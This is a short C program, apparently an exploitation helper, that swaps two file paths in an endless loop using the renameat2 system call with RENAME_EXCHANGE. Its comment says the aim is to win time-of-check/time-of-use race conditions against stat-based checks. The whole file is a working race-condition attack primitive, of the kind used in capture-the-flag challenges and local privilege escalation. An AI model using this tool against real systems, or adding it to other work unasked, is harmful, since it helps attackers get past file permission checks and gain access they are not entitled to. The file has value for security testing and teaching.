#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

// constantly swap filenames to enable race conditions, work well against sys/syscall.h::stat
// arg1 <= filepath to test race condition
// arg2 <= filepath to use as swap for race condition

void syscall_renameat2(char *filepath_to_race, char* filepath_to_swap){
    while (1){
        syscall(SYS_renameat2, AT_FDCWD, filepath_to_race, AT_FDCWD, filepath_to_swap, RENAME_EXCHANGE);
    }
}

int main(int argc, char *argv[]){
    if (argc != 3)
        return 1;
    syscall_renameat2(argv[1], argv[2]);
    return 0;
}
